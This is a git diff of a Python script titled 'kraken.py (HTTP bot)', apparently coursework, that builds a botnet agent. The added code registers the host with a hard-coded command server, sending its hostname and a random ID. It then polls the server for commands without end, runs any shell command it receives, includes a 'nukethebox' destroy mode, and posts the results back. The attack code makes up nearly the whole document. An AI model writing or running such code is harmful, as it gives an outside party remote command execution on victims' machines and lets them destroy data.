@@ -1,38 +1,21 @@
 #!/usr/bin/env python3
-// Amanda Brown (aeb6590) 
-// kraken.py (HTTP bot) 
+# Amanda Brown (aeb6590) 
+# kraken.py (HTTP bot) 
 
+# import necessary libraries 
 import json
+import socket
 import requests
 import subprocess
 import time
-from random import * 
+import string
+import random 
 
-PORT = 8080
-EX = 0
 
+# Define the bot 
 class Bot:
     def _init_(self,uuid):
-        self.uuid = getUUID()
- 
-    def getUUID():
-        uuid = random() 
-        return uuid
-
-    def request():
-        r = requests.get('http://127.0.0.1') 
-        cmd = r.json()
-        execution(cmd)
-
-    def execution(cmd):
-        command = cmd.split() 
-        subprocess.run(command)
-        // if execution is successful store in data to be sent 
-
-    def response():
-
-
-b = Bot(random())
+        self.uuid = uuid
 
 # Execute a passed in shell command 
 def shellExec(command): 
@@ -44,15 +27,42 @@ def nuke(command):
 
 # Figure the bot's sleep time
 def sleepTime(ret):
-    if ret == 200: 
-        sleepTime = 3
-    else: 
-        sleepTime = 
+    sleepTime = 3
+    if ret != 200: 
+        sleepTime = 300
+    return sleepTime
+
+# Get a random 64 letter uuid for the bot
+def getUUID():
+    chars = string.ascii_letters
+    uuid = ''.join(random.choice(chars) for i in range(64))
+    return uuid
 
 # Execute the program
 def main():
-    while (EX = 0):
-        cmd = requests.get('http://129.21.115.114:8080')
+
+    status = 0
+    
+    # Instantiate the bot and give it a uuid 
+    kraken = Bot()
+    kraken.uuid = getUUID()
+
+    host = socket.gethostname() 
+    server = 'http://129.21.115.114:8080'
+    
+    # Send the bot info to the server
+    botInfo = {'uuid':kraken.uuid, 'interval':5, 'interval_delta':5, 'server':server,'hostname':host, 'interface':'eth0'}
+    
+    # Keep attempting to connect
+    while (status != 200):
+        register = requests.post(server + '/register', botInfo)
+        status = register.status_code
+        time.sleep(5)
+
+    # Keep looping for commands 
+    while (True):
+        cmd = requests.get(server + '/getcommand')
+        cmd = cmd.text
         parsedCmd = json.loads(cmd)
         
         # If server replies with shell execution command
@@ -62,7 +72,12 @@ def main():
         # If server replies with nuke the box command 
         if parsedCmd.get("mode") == "nukethebox": 
             resp = nuke(parsedCmd.get("params"))
-
-        ret = requests.post('http://129.21.115.114:8080')
-
+        
+        botSend = {'uuid':kraken.uuid,'uaid':parsedCmd.get("uaid"), 'error':0, 'resp':resp}
+        ret = requests.post(server,botSend)
+        
+        # Time to sleep 
         TTS = sleepTime(ret.status_code) 
+        time.sleep(TTS)
+
+main()
